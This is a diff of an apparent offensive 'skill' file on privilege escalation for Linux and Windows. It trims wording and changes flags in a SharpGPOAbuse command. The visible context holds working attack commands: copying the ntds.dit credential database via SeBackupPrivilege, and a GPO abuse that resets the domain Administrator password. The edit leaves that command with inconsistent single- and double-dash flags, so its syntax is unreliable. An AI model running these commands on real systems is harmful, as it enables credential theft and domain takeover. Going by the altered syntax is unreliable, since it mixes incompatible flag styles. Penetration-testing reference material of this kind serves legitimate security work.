@@ -1,6 +1,6 @@
 ---
 name: privilege-escalation-methods
-description: "Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations."
+description: "Provide techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -31,7 +31,7 @@ Provide comprehensive techniques for escalating privileges from a low-privileged
 
 ---
 
-## Core Techniques
+## Techniques
 
 ### Linux Privilege Escalation
 
@@ -176,7 +176,7 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 #### 5. Abusing GPO
 
 ```powershell
-.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
+.\SharpGPOAbuse.exe -AddComputerTask -Taskname "Update" `
   --Author DOMAIN\<USER> --Command "cmd.exe" `
   --Arguments "/c net user Administrator Password!@# /domain" `
   --GPOName "ADDITIONAL DC CONFIGURATION"
